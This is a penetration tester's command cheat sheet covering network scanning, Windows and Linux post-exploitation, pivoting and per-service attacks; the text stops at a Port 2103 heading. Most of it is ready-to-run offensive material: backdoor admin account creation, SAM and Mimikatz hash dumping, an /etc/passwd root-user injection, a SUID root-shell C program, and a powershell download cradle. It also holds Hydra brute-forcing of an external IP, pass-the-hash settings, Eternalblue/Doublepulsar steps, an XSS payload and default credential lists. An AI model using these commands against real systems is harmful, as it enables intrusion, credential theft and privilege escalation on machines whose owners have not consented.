ssh user@IP mkdir -p .ssh
cat .ssh/id_rsa.pub | ssh user@IP 'cat >> .ssh/authorized_keys'
ssh -i id_rsa user@IP
-----------

-----------Create the public_key from the private_key to COMPARE them
ssh-keygen -y -f <private key file>
-----------

-----------Setup certs Letsencrypt on bitnami machine
sudo rm /etc/letsencrypt/archive/xxxxxxx.com/*
sudo /home/bitnami/certbot-auto certonly -d xxxxxx.com --webroot -w /home/bitnami/apps/wordpress/htdocs/
sudo mv /etc/letsencrypt/archive/xxxxxxxx.com-0001/cert1.pem /opt/bitnami/apache2/conf/server.crt
sudo mv /etc/letsencrypt/archive/xxxxxxxx.com-0001/privkey1.pem /opt/bitnami/apache2/conf/server.key
sudo chown bitnami:root /opt/bitnami/apache2/conf/server.key
sudo chown bitnami:root /opt/bitnami/apache2/conf/server.crt
sudo /opt/bitnami/ctlscript.sh restart apache
-----------

-----------Add certificates Ubuntu
sudo mkdir /usr/share/ca-certificates/example
sudo cp example.crt /usr/share/ca-certificates/example/example.crt
sudo dpkg-reconfigure ca-certificates
-----------

-----------Create public samba shared folder
# https://www.thomas-krenn.com/en/wiki/Simple_Samba_Shares_in_Debian
apt-get install samba
vim /etc/samba/smb.conf
# Add
[public]
security = share
path = /home/blabla
browseable = yes
read only = yes
guest ok = true
# End Add
service smbd start
-----------

-----------Git basic commands
# Clone
git clone git@git.test.com:dma_attack.git

# Commit
git add *
git commit -m "Coment"
git push origin master

# Update local repo with the remote one
git pull

# Force git pull
git fetch origin 
git reset --hard origin/master

# Show changes in the branch
git status -s

# View changes in the specified file
git diff <filepath + filename>

# Differences between branches
git diff (local-branch) (remote-branch)

# Create new local branch
git branch <new_branch>
git checkout <new_branch>

# Merge with the remote branch
git checkout master
git pull origin master
git merge <new_branch>
git push origin master

# Move to a remote branch
git checkout -b xxxx origin/xxx
-----------

-----------Nice Git client in terminal
# https://github.com/jesseduffield/lazygit
-----------

-----------IPv6 access
http://[1a05:2112:6:3::7]/test
-----------

-----------hex to binary - xxd
xxd -r -p
-----------

-----------SSH forwarding from ssh shell - keys - pivoting
Enter + shift + tilde(`) + c
ssh> -L 3389:127.0.0.1:4444
-----------

-----------webdav python
pip install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=8080 --root=/tmp
-----------

-----------Print all the IPs of a range
apt-get install prips
prips 10.0.0.20 10.0.0.23
-----------

-----------Shodan script to work with the API
easy_install shodan
shodan init <SHODAN_API_KEY>
shodan host <IP>
-----------

-----------Visually(terminal) enable/disable services - linux
sudo apt-get install sysv-rc-conf
sudo sysv-rc-conf
-----------
=================================><===


=================================>NMAP & NETWORK SCAN <===
-----------NMAP script (fast) discover NFS (discover .1 ranges and then look for NFS service)
nmap -sn 10.209.*.1 -n -T5 --min-rate 1000 --max-retries 1 | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | while read line; do echo 'echo "'--$line'"'>>nmap.sh; 
echo "nmap -sT "$line'/24 -p 2049 -n -T4 --min-rate 1000 --max-retries 1 --open | grep "Nmap scan" | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*"'>>nmap.sh; done;chmod +x nmap.sh;./nmap.sh
-----------

-----------NMAP script (fast) get IP/port of the subnet
nmap -sn 192.*.*.1 -n -T5 --min-rate 1000 --max-retries 1 | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | while read line; do echo 'echo "'--$line'"'>>nmap.sh; 
echo "nmap -PN -n "$line'/24 -p 21,22,23,25,53,80,443,123,3306,1433,1521,1525,3389,8080,3128,139,445,5555,9008 -n -T4 --min-rate 1000 --max-retries 1 --open | 
grep -E "report|open"'>>nmap.sh; done;chmod +x nmap.sh;./nmap.sh 2> /dev/null
-----------

-----------NMAP script (fast) alive hosts
nmap -sn 192.168.0-150.* -n -T4 --min-rate 1000 --max-retries 1
-----------

-----------NMAP script (superfast) inverse scann
for i in {254..0}; do nmap -sn 10."$i".*.* -n -T4 --min-rate 7000 --max-retries 1 | grep report | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" >> ipscable2.txt; done
-----------

-----------NMAP typical ports (fast, as you select specific ports)
nmap -sT X.X.X.X -p 21,22,23,25,53,80,443,123,3306,1433,1521,1525,3389,8080,3128,139,445,5555,9008
-----------

-----------NMAP a lot of info
nmap -sT -A -oA pepe X.X.X.149-150
-----------

-----------Pasive scann
netdiscover -p
-----------

-----------Save in file
nmap -sT 10.10.5.* -oX pepe-10_10_5_*.xml
-----------

-----------NMAP through an http proxy (also socks4:// or socks5://) (faster than usign proxychains)
nmap -sn 10.*.*.1 --proxy http://X.X.X.X:8123 -e <iface>			--> add the interface to avoid scanning your own machine ??
-----------

-----------NSE search nmap
https://github.com/JKO/nsearch
-----------

-----------NMAP NSE
nmap -p 80 --script dns-brute.nse vulnweb.com					--> DNS bruteforce
nmap -p 80 --script hostmap-bfk.nse nmap.org					--> get other hosts on the same IP
sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 hackertarget.com		--> traceroute geolocation
nmap --script http-title -sV -p 80 X.X.X.X/24					--> print titles
sudo nmap -n -sP X.18.1.0/24									--> IP & MAC
nmap -n --script smb-os-discovery.nse -p445 X.18.1.1-255		--> samba discovery, also machine name
nmap --script smb-enum-users.nse -p445 172.18.1.*				--> user enumeration
sudo nmap -A X.18.1.160										--> more info
sudo nmap -OA -n X.18.1.160									--> operative system
nmap -sL www.pepe.com 											--> enumerate hosts surrounding
nmap --script ssl-enum-ciphers -p 443 <host>					--> nmap to get cipher version's (SSL TLS)
-----------

-----------Masscan - async scanner, much faster than nmap
masscan --range "X.168.0.1/24" --ports T:1-65535 --rate 10000 --output-filename pepe.xml
-----------

-----------Bypass (try) firewall
# https://pentestlab.blog/2012/04/02/nmap-techniques-for-avoiding-firewalls/
# Scan flags:
nmap --scanflags ACKPSH 10.10.10.X -sV
-----------
=================================><===


=================================>POST EXPLOITATION <===
-----------Enable RDP Remote Desktop (Windows)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-----------

-----------Disable RDP Remote Desktop (Windows)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
-----------

-----------Crete Local User (Windows)
net localgroup 											--> view the admin's group - Also: net localgroup Administrators
net user /add [username] [password]						--> add user * on the pass to avoid history tracking
net localgroup Administrators [username] /add			--> "Administradores" is the group
net localgroup "Remote Desktop Users" [username] /ADD 	--> it might be necessary to add it to this group to use RDP
-----------

-----------Remove Local User (Windows)
net user [username] /delete
-----------

-----------Check if the user exists or has the permissions
net use \\X.X.X.X /user:THEDOMAIN\THEUSERNAME thepassword
-----------

-----------Search interesting files - post exploitation (like ls -R but with the complete route)
find ./* -iname "*passw*" -o -iname "*pst*" -o -iname "*contrase*" -o-iname "*usuar*"
-----------

-----------STEAL THE HASH (Windows) [Related: Pass the hash, Create local user]
On the Windows machine:
	reg save hklm\sam c:\sam
	reg save hklm\system c:\system
On Kali: (pepekey is the file to store)
	bkhive system pepekey
	samdump2 sam pepekey
-----------

-----------STEAL THE HASH con Mimikatz (Windows) (as admin)
mimikatz.exe privilege::debug inject::process lsass.exe sekurlsa.dll mimikatz # @getLogonPasswords # sekurlsa::logonpasswords
+info:https://blog.netspi.com/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/
-----------

-----------Mimikatz unoffitial guide
# https://adsecurity.org/?page_id=1821
-----------

-----------INFORMATION GATHERING (Windows)
# Execute query MSSQLSERVER - MSSQL
"C:\Program Files\Microsoft SQL Server\100\Tools\Binn\SQLCMD.exe" -S xxxtest -U sa -P PASSXXX -Q "select @@version"

# Execute query SQLEXPRESS - MSSQL
"C:\Program Files\Microsoft SQL Server\100\Tools\Binn\SQLCMD.exe" -S .\SQLEXPRESS -U sa -P PASSXXX -Q "@@version"

# Get a users list that haven't log in on the last 16 weeks and are still active
dsquery user -inactive 16 -limit 0 | dsget user -fn -ln -samid -disabled | find /v "dsget" | find /v "samid" | find /v "yes"

# Get a list of machines by OS, cahnge the "Windows Server" on the operatingSystem variable to get other systems)
dsquery * domainroot -filter “(&(objectCategory=computer)(operatingSystem=Windows Server*))” | dsget computer -samid

# List all the users
dsquery user -limit 0 | dsget user -fn -ln -samid -disabled

# Version of the OS
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Get the .NET versions
dir "C:\windows\Microsoft.NET\Framework"

# Get the local administrators
net localgroup administrators

# Get the updates list and the date
wmic qfe list

# Get a list of all the users
dsquery user -limit 0

# Get the domain groups
net group "Domain admins" /DOMAIN

# Get the domain users
net user /DOMAIN

# Get the Java version
java version

# Get the system variables
set

# Get all the services running
net stat

# Scheduled tasks
schtasks

# IP configuration
ipconfig /all FR

# User information
whoami /all

# ARP table
arp -a
-----------

-----------MYSQL queries - execute directly on the shell
mysql -u bassline -h X.X.X.X -p bassline_xxxxx -e "SELECT login,pwd,email FROM marchands"
mysql -u root -p -e "SHOW DATABASES"
mysql -u root -p squid -e "SHOW TABLES FROM squid;"
-----------

-----------Mysql - Privilege-Granting Guidelines
# https://dev.mysql.com/doc/mysql-security-excerpt/5.6/en/privileges-provided.html
### FILE 
Can be abused to read into a database table any files that the MySQL server can read on the server host. This includes all world-readable files and files in the server's data directory. The table can then be accessed using SELECT to transfer its contents to the client host.
### GRANT OPTION 
Enables users to give their privileges to other users. Two users that have different privileges and with the GRANT OPTION privilege are able to combine privileges.
### ALTER 
May be used to subvert the privilege system by renaming tables.
### SHUTDOWN
Can be abused to deny service to other users entirely by terminating the server.
### PROCESS 
Can be used to view the plain text of currently executing statements, including statements that set or change passwords.
### SUPER 
Can be used to terminate other sessions or change how the server operates.
### others
Privileges granted for the mysql system database itself can be used to change passwords and other access privilege information:
Passwords are stored encrypted, so a malicious user cannot simply read them to know the plain text password. However, a user with write access to the mysql.user system table Password column can change an account's password, and then connect to the MySQL server using that account.
INSERT or UPDATE granted for the mysql system database enable a user to add privileges or modify existing privileges, respectively.
DROP for the mysql system database enables a user to remote privilege tables, or even the database itself.
-----------

-----------MySQL cheat sheet commands
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-----------

-----------MSSQL queries
# Show all databases
SELECT name FROM master.dbo.sysdatabases
-----------

-----------SQLITE dump all the database
sqlite3 <database file>
sqlite3 <database file> .dump >output.sql
-----------

-----------Get the wifi credentials (Linux)
cd /etc/NetworkManager/system-connections/
-----------

-----------Windows-Exploit-Suggester
In a Windows machine --> systeminfo > systeminfo.txt
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester
sudo pip install xlrd
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2016-02-18-mssb.xls --systeminfo systeminfo.txt 
-----------

-----------Metasploit missing patches enumerator (Post module)
use post/windows/gather/enum_patches
-----------

-----------Brico Post-Explotación 	**check
https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
garage4hackers.com/showthread.php?t=1449
https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US
-----------

-----------POST exploitation LINUX (INFORMATION GATHERING)
# http://www.rebootuser.com/?p=1623#.VkypkLPL_7B
-----------

-----------Mounted other Network Volumes - Linux
/etc/fstab
-----------

-----------Meterpreter post module to dump local users hash
use post/windows/gather/cachedump
-----------

-----------Meterpreter post module to dump domain users hash
# hashdump
use post/windows/gather/hashdump
# smarthashdump
use post/windows/gather/smart_hashdump
-----------

-----------Meterpreter Forward a port
portfwd add –l 3389 –p 3389 –r 172.16.X.X
portfwd 	
-----------

-----------Dynamic port forward through SSH - pivoting - Port(22)
# http://www.hackplayers.com/2018/05/taller-de-pivoting-tuneles-ssh.html
### Local port forward (just one port, accessible directly from the attacker)
ssh -L 3389:192.168.2.X:3389 user@192.168.2.X
### Dynamic port forward (forward all ports, proxy needed)
ssh -D 2049 root@192.168.1.X1
vim /etc/proxychains.conf
	socks4 	127.0.0.x1 2049
proxychains telnet 127.0.0.X1 2049
### Remote port forward (any access to the remote port 8888 on the target will be redirected to 1234 on the attacker machine)
echo "GatewayPorts yes" >> /etc/ssh/sshd_config
ssh -R 8888:192.168.2.X:1234 bob@ssh.youroffice.com
### VPN over SSH
# http://www.hackplayers.com/2018/05/taller-de-pivoting-tuneles-ssh.html
-----------

-----------Forward just one port through SSH - pivoting - Port(22)
ssh -L 3389:192.168.2.X:3389 user@192.168.2.X
-----------

-----------Meterpreter - Pivoting (proxychains)
Meterpreter
	background 										--> exit from meterpreter to metasploit console
Msfconsole
	route add 192.168.64.X1 255.255.255.X0 1			--> once it's created we can use other modules agains it
	route print
	use auxiliary/server/socks4a
	run
vim /etc/proxychains
	socks4 	127.0.0.X1 9050
proxychains ping 192.168.43.X1
-----------

-----------Meterpreter - pivoting - port forwarding
# https://www.offensive-security.com/metasploit-unleashed/portfwd/
# forward remote port to local address
meterpreter > portfwd add –l 3389 –p 3389 –r X.X.X.X
kali > rdesktop 127.0.0.X1:3389
-----------

-----------Access TCP ports through HTTP (uploading .php)
# reDuh evolution
# https://github.com/sensepost/reGeorg
-----------

-----------Command to add to crontab and execute every 5 minutes
(crontab -l ; echo "*/5 * * * * /home/pepe/script.sh") | sort | uniq | crontab
-----------

-----------Look for all the services in the host that are running without quoting (privilege escalation)
# https://pentestlab.blog/2017/03/09/unquoted-service-path/
# http://www.sniferl4bs.com/2017/03/scripts-for-linux-enumeration-privilege.html
# When you try to launch a service from an unquoted location it tries to reach it also inside of the folders of the path
# so an attacker could write a file with the same name in any of this folders to escalate privileges.
# Also metasploit module: exploit/windows/local/trusted_service_path
wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
-----------

-----------Get the group policy credentials on a Domain Controller
# https://pentestlab.blog/2017/03/20/group-policy-preferences/
post/windows/gather/credentials/gpp
-----------

-----------Add a user to the /etc/passwd
perl -e 'print crypt("password", "XX"). "\n"'			--> XXq2wKiyI43A2
myroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash
-----------

-----------Privilege escalation via weak service permissions
# https://pentestlab.blog/2017/03/30/weak-service-permissions/
Option 1:
	accesschk.exe -uwcqv "userXXX" * -accepteula
	sc config "ServiceName" binPath= "command to execute XXXX"
Option 2:
	use exploit/windows/local/service_permissions
-----------

-----------Bypass applocker - (Windows)
# https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
# https://github.com/api0cradle/UltimateAppLockerByPassList
-----------

-----------Rundll - other windows default dll to execute commands
# http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/
rundll32 zipfldr.dll, RouteTheCall calc.exe
rundll32 advpack.dll, RegisterOCX calc.exe
rundll32 C:\windows\system32\IEAdvpack.dll,RegisterOCX C:\path\to\payload.dll
rundll32 C:\windows\system32\IEAdvpack.dll,RegisterOCX C:\path\to\payload.exe
rundll32.exe url.dll,OpenURL "local\path\to\harmless.hta"
rundll32.exe url.dll,OpenURLA "local\path\to\harmless.hta"
rundll32.exe shdocvw.dll, OpenURL [path to file.url]
-----------

-----------Icmpsh - command and control throught ICMP
# https://pentestlab.blog/2017/07/28/command-and-control-icmp/
# Good if all the ports are filtered
-----------

-----------Get root with SUID
# http://koltsoff.com/pub/getroot/
#include <unistd.h>	/* setuid, .. */
#include <sys/types.h>	/* setuid, .. */
#include <grp.h>	/* setgroups */
#include <stdio.h>	/* perror */

int main (int argc, char** argv) {

  gid_t newGrp = 0;

  /**
    if you installed programming manual pages, you can get the
    man page for execve 'man execvp'. Same goes for all the
    other system calls that we're using here.
   */

  /* this will tattoo the suid bit so that bash won't see that
     we're not really root. we also drop all other memberships
     just in case we're running with PAGs (in AFS) */
  if (setuid(0) != 0) {
    perror("Setuid failed, no suid-bit set?");
    return 1;
  }
  setgid(0);
  seteuid(0);
  setegid(0);
  /* we also drop all the groups that the old user had
     (verify with id -tool afterwards)
     this is not strictly necessary but we want to get rid of the
     groups that the original user was part of. */
  setgroups(1, &newGrp);
  
  /* load the default shell on top of this program
     to exit from the shell, use 'exit' :-) */
  execvp("/bin/sh", argv); 

  return 0;
}
-----------

-----------Scan port with powershell - Windows
powershell Test-NetConnection -ComputerName 10.10.14.5 -Port 80
-----------

-----------Curl for powershell - Windows
powershell (new-object net.webclient).downloadstring('http://10.10.14.5:80/a')
-----------

-----------Pivoting guide
# https://artkond.com/2017/03/23/pivoting-guide/
-----------

-----------ReGeorg - pivoting from a webshell ( aspx | ashx | jsp | php )
# https://github.com/sensepost/reGeorg
-----------

-----------Get Credentials in clear text (SYSTEM permissions)
# https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
LSA Secrets
LSASS Process
Credential Manager
Group Policy Preferences
-----------

-----------get DC list
nltest /dclist:domainname
-----------
=================================><===


=================================>SERVICES <===
-----------SSH user enumeration - Port(22)
use auxiliary/scanner/ssh/ssh_enumusers
# Default/vendors users:
	root
	admin
	test
	guest
	info
	adm
	mysql
	user
	administrator
	oracle
	ftp
	vmware
	vcoadmin
	vcloud
	system
	iscadmin
	iaadmin
	lservice
	userid
	USERID
	maint
	ibmuser
	ibm
	username
	hscroot
	superadmin
	default
	IPC
	VSEMAN
-----------

-----------HYDRA SSH bruteforce - Port(22) 
hydra -l root -P 500-worst-passwords.txt X.X.X.X ssh
hydra -l test -P /media/sf_Shared_vm/Fuzzing\&Pass/SecLists/Passwords/10_million_password_list_top_100000.txt 114.255.x.x ssh -t 12
-----------

-----------FTP (anonymous) - Port(23)
Metasploit: auxiliary/scanner/ftp/anonymous
-----------

-----------FTP (Proftpd) - Port(23)
#site help
#site cpfr /etc/passwd
#site cpto /tmp/passwd.copy
-----------

-----------Mainframe 3270 TSO z/OS - Port(23), Port(623)
# Use x3270 emulator to connect
- TSO or LOGON <user>		--> DB2ADM:DB2ADM typical (maybe they ask to change the pass)
- ravary					--> To view the Resource Access Control Facility datasets
- Upload the RACF to your own server
	ftp X.X.X.X
	binary
	put 'SYS1.RACFBCK1'
- password password 		--> to change the password again
- Convert racf to john format
	/root/john-1.8.0-jumbo-1/run/racf2john racf > racf.john
- Run john
	/john-1.8.0-jumbo-1/run/john --incremental=UpperNum racf.john  
-----------

-----------SMTP (mail relay) - Port(25)
telnet x.x.x.x 25
HELO x.x.x.
MAIL FROM: me@jou.com
RCPT TO: fOU@;ou.com
DATA
Thank You.
quit
-----------

-----------SMTP enumeration - Port(25)
smtp-user-enum -M VRFY -U users.txt -t X.X.X.X			--> by default on kali
# --
use auxiliary/scanner/smtp/smtp_enum
-----------

-----------To check if a specific port works over SSL
openssl s_client -connect X.X.X.X:993
-----------

-----------To check if it's vulnerable to Poodle - SSLv3
openssl s_client -connect X.X.X.X:993 -ssl3
# https://github.com/mpgn/poodle-PoC					--> Poodle POC
-----------

-----------DNS (add new registers to the DNS) domain - Port(53)
dnsfun.exe –s  IP_DNS –q FAKE_DOMAIN –u FAKE_IP
ex: # dnsfun.exe -s X.X.X.X -q pepe.com -u 6.6.6.X6
URL(dnsfun): http://www.tarasco.org/security/dnsfun/index.html
-----------

-----------Bruteforce subdomains - DNS - Port(53)
URL: https://github.com/TheRook/subbrute
./subbrute.py ebay.com
-----------

-----------Bruteforce subdomains big list (all.txt)
https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a
-----------

-----------Bruteforce + intel subdomains - DNS - Port(53)
# Evolution of subbrute
git clone https://github.com/aboul3la/Sublist3r
python Sublist3r -d "Domain"
-----------

-----------Subdomain efficient bruteforce ALTDNS + MASSDNS - Port(53)
# Subdomains permutation from a list
https://github.com/infosec-au/altdns
# Super fast DNS resolver
https://github.com/blechschmidt/massdns
# DNS dictionary list
https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056
-----------

-----------Subdomain Searcher - DNS - Port(53)
Dnsmap "domain" -r file.txt 			--> Look for the subdomains and save the results
-----------

-----------Subdomain searcher online - DNS - Port(53)
similarweb.com
virustotal.com
-----------

-----------CTRF - subdomain search by certificate transparency (AXFR) - Port(53)
# https://github.com/UnaPibaGeek/ctfr
python3 ctfr.py -d example.com
-----------

-----------Reverse domanin rDNS online - Port(53)
https://www.threatcrowd.org/ip.php?ip=192.161.154.x
-----------

-----------Nslookup - Port(53)
nslookup example.com
set type=mx 							--> mail
set type=ns 							--> DNS
set debug 								--> more info in debug mode
set type=A 								--> change the query type to ask directly to the DNS
server "IP_DNS" 						--> IP of the DNS where we want to make the query
-----------

-----------Dig - Port(53)
dig example.com
dig +short example.com
dig MX example.com				--> Mail server
dig NS +short example.com		--> Name Server and hosted zone
dig example.com +trace			--> Trace https://ns1.com/articles/using-dig-trace
dig +short -x 8.8.8.8			--> Domain name of the IP (you can also get the region of the AWS)
# NOERROR						--> All good, results in the ANSWER
# NOERROR & NO ANSWER			--> Domain exists but it has no records
# NXDOMAIN						--> Non-existent Domain
-----------

-----------Resolve domain from a specific DNS server - Port(53)
nslookup adomain.com 8.8.8.8
-----------

-----------DNS zone transfer - Port(53)
dig AXFR company_domain.net @81.16.X.X 				--> host IP to view the domain
-----------

-----------Sharepoint XSS - Port(80)
# http://respectxss.blogspot.co.uk/2017/06/a-look-at-cve-2017-8514-sharepoints.html
http[s]://<SHAREPOINT URL>?FollowSite=0&SiteName='-confirm(document.domain)-'
-----------

-----------NTP - Port(123)
nmap script ntp-monlist.nse
-----------

-----------SNMP - Port(161)
Metasploit:
	auxiliary/scanner/snmp/snmp_enum
	auxiliary/scanner/snmp/snmp_enumshares
	auxiliary/scanner/snmp/snmp_enumusers
snmpwalk -v 1 -c public <IP>
-----------

-----------LDAP export with anonnymous user - Port(389)
jxplorer
http://jxplorer.org/
-----------

-----------LDAP Swiss Army Knife - Port(389) Port(636)
# https://www.exploit-db.com/docs/english/46986-ldap-swiss-army-knife.pdf
-----------

-----------LDAP - attack and scenarios
# https://www.exploit-db.com/docs/english/46986-ldap-swiss-army-knife.pdf
-----------

-----------SMB - Port(445), Port(139)
SuperScan.exe
	URL(superscan): http://www.mcafee.com/es/downloads/free-tools/superscan.aspx
Scripts NMAP:
	smb-check-vulns.nse 
	smb-enum-domains.nse
	nmap -n --script smb-enum-shares.nse 10.10.X.X -p 445
	smb-enum-groups.nse
	smb-enum-users.nse
Metasploit:
	auxiliary/scanner/smb/smb_enumshares
	auxiliary/scanner/smb/smb_enumusers
	auxiliary/scanner/smb/smb_login
	auxiliary/scanner/smb/smb_version
-----------

-----------Retrieve checkpoint hostname - Port(264)
use auxiliary/gather/checkpoint_hostname
-----------

-----------SMB view shares - Port(445)
smbclient -U "pepe" -L X.X.X.X
smbclient -U "domainexample\userexample%passwordexample" -L 10.10.10.100
-----------

-----------SMB connect - Port(445)
smbclient -U "pepe" "\\\\X.X.X.X\\Users"
-----------

-----------Responder LLMNR NTLM - Port(445) Internal Network
# Info: Security windows protocol, if some service tries to connect somewhere and can't reach it, a broadcast is sent
# to check if any other computer knows the service. So an attacker could just inject a message saying that he is the service, 
# and therefore the server will send its credentials.
# To trigger the attack we should try to access to a wrong shared folder \\printerrr
# Unfortunately it's not possible to make pass-the-hash with it, but instead it's possible to bruteforce the hash (hashcat, ocl-hashcat)
sudo python Responder.py -i <attacker_ip> -I eth0 -d SMB -b 0 -r 1 -v
sudo python Responder.py -I eth0 -A 										--> analysis mode (no inject)
-----------

-----------SMBRelay
# http://resources.infosecinstitute.com/exploiting-windows-authentication-protocols-part-01/
# There is also a smbrelay module in responder.py
-----------

-----------Smbexec - Port(445)
# Alternative: metasploit -> use exploit/windows/smb/psexec
--> Info: To make it work with local machines: (it's not necessary in domain machines)
--> "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" add a new DWORD (32-bit) called “LocalAccountTokenFilterPolicy” and set it to 1
--> "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" set RequireSecuritySignature to 0
--> Install Kali: apt-get install mingw-w64; https://github.com/pentestgeek/smbexec.git; install.sh
smbexec
-----------

-----------Enumerate null sessions - Port(445)
nmap -vv -p445 --script=smb-enum-sessions X.X.X.X
-----------

-----------Connect windows (SMB) client - Port(445)
rpcclient -U "pepe" X.X.X.X
-----------

-----------Connect windows (SMB) null session - Port(445)
rpcclient -U "" X.X.X.X
(enter without pass)
-----------

-----------Rpcclient automatic (SMB) null session - Port(445)
v1:
	ip="10.10.2."; cmd="enumdomusers"; for i in {1..254}; do echo "--$ip$i"; rpcclient -U "" -N "$ip$i" -c $cmd; done
v2:
	ip="10.10.2."; cmd="enumdomusers"; nmap -sn -n $ip"*" --open | grep report | cut -d " " -f 5 | while read line; do echo "--$ip"; rpcclient -U "" -N "$ip" -c $cmd; done
-----------

-----------Rpcclient commands - Port(445)
rpcclient $> enumdomusers
	user:[Administrator] rid:[0x1f4]
rpcclient $> enumdomgroups
rpcclient $> queryuser 0x1f4
rpcclient $> lookupnames root
root S-1-22-1-0 (User: 1)
rpcclient $> lookupsids S-1-22-1-0
S-1-22-1-0 Unix User\root (1)
rpcclient $> lookupsids S-1-22-1-1000
S-1-22-1-1000 Unix User\pepe (1)
# change another user's password, also admin (not DA)
rpcclient $> setuserinfo2 adminuser 23 'thepassword'
-----------
	
-----------Hydra SMB bruteforce - Port(445)
hydra -l lewis -P common-passwords.txt X.X.X.X smb -V
-----------

-----------Pass the hash - o it only checks if it's possible to access (to execute commands psexec or smbexec) - Port(445)
Metasploit:
	use auxiliary/scanner/smb/smb_login
	set SMBPass aad2b222b51401e22ad1143511444ee:4ad220447dc55fc0664e7706f8889915
	set SMBUser Administrator
	set rhosts 10.204.X.X
	run
-----------

-----------Psexec to RCE - SMB - Port(445)
use exploit/windows/smb/psexec				--> needs admin permissions in the target system
set rhost 10.10.X.X
set smbpass aad2b222b51401e22ad1143511444ee:4ad220447dc55fc0664e7706f8889915
set smbuser Administrator
-----------

-----------Psexec (windows)
# Upload psexec: https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
PsExec.exe \\10.10.121.101 -u Administrator -p <password> ipconfig
-----------

-----------Fuzzbunch (shadowbrokers) - Eternalblue - Port(445)
# Attacker Win XP= 10.0.2.X8
# Attacker Kali= 10.0.2.X7
# Victim Win7= 10.0.2.X9
python fb.py
	Target IP Address = 10.0.2.X9
  	Callback IP= 10.0.2.X8
	Use redirect= no
	Ok..ok..ok..ok..ok
use Eternalblue
	Ok..ok..ok..ok..ok
	Delivery Mechanism= 1
	Ok..ok..ok..ok..ok
use Doublepulsar
	Ok..ok..ok..ok..ok
	Operation for backdoor= 2 RunDll
	DllPayload= C:\Documents and Settings\pepe\Desktop\shadowbroker-master\windows\launchers\launcher.dll
-----------

-----------Eternalblue - python RCE - (MS17-010) - Port(445)
https://www.exploit-db.com/exploits/42030/				--> Windows Windows 8/2012 R2 (x64)
# https://www.exploit-db.com/docs/42280.pdf?rss
https://www.exploit-db.com/exploits/42031/				--> Windows Windows 7/2008 R2 (x64)
https://www.exploit-db.com/exploits/42315/				--> Windows 7/8.1/2008 R2/2012 R2/2016 without crashing (best one)
-----------

-----------Eternalblue scanner (MS17-010) - Port(445)
use auxiliary/scanner/smb/smb_ms_17_010
-----------

-----------Exploit ETERNALBLUE (MS17-010) (without the .exe) - metasploit - Port(445)
# https://github.com/RiskSense-Ops/MS17-010/blob/master/exploits/eternalblue/ms17_010_eternalblue.rb
# https://research.checkpoint.com/eternalblue-everything-know/
exploit/windows/smb/ms17_010_eternalblue
-----------

-----------EternalRed - RCE for SMB 3.5.0 - 4.5.4/4.5.10/4.4.14 - Port(445)
# https://www.exploit-db.com/exploits/42060/
-----------

-----------Internet Key Exchange (IKE) - IPsec VPN - Port(500) UDP
# http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
# Check if they work in agressive mode, they send the authentication hash (pre-shared key) without encryption (no Diffie-Helman)
# The main mode uses 6 messages instead of 3 (agressive mode) so it can encrypt the hash.
ike-scan X.X.X.X -M -A				--> checks agressive mode
ike-scan X.X.X.X --showbackoff;		--> checks if it can guess the vendor
-----------

-----------Cisco ASA VPN (extrabacon)	(IKE,SNMP) - Port(500), Port(161) UDP
# More info: http://2014.ruxcon.org.au/assets/2014/slides/Breaking%20Bricks%20Ruxcon%202014.pdf
# Other versions added: https://github.com/RiskSense-Ops/CVE-2016-6366
use auxiliary/admin/cisco/cisco_asa_extrabacon
# Version grabber
https://X.X.X.X/CSCOSSLC/config-auth
-----------

-----------Lotus user enumeration - Port(1352)
nmap --script domino-enum-users -p 1352 172.29.X.X
-----------

-----------MSSQL queries - Port(1433), Port(1432)
Metasploit:
	auxiliary/scanner/mssql/mssql_ping  			--> version detector
	auxiliary/scanner/mssql/mssql_login
# --
DBSOLO 												--> to connect to different DDBB
# --
Default credentials:
	SA/Blank
	SA/SA
	user/hash										--> pass the hash
-----------

-----------ORACLE detect SID and look for default creds - Port(1521), Port(1525), Port(1526)
SID enumerator:
	auxiliary/scanner/oracle/sid_enum
Default credentials by SID:
	CITRIX:
		CTXSYS/CTXSYS
		DBSNMP/DBSNMP
		SCOTT/TIGER
		SYSTEM/MANAGER
		CITRIXIMA/CITRIXIMA
		DBSNMP/DBSNMP
		SCOTT/TIGER
		SYSTEM/MANAGER
	CITRIX4:
		CITRIXIMA/CITRIXIMA
		DBSNMP/DBSNMP
		SCOTT/TIGER
		SYSTEM/MANAGER
	RMCTX:
		DBSNMP/DBSNMP
		SYSTEM/MANAGER
-----------

-----------Microsoft Message Queueing Service - Windows 2000 ALL / Windows XP SP0-SP1 (English) - Port(2103)
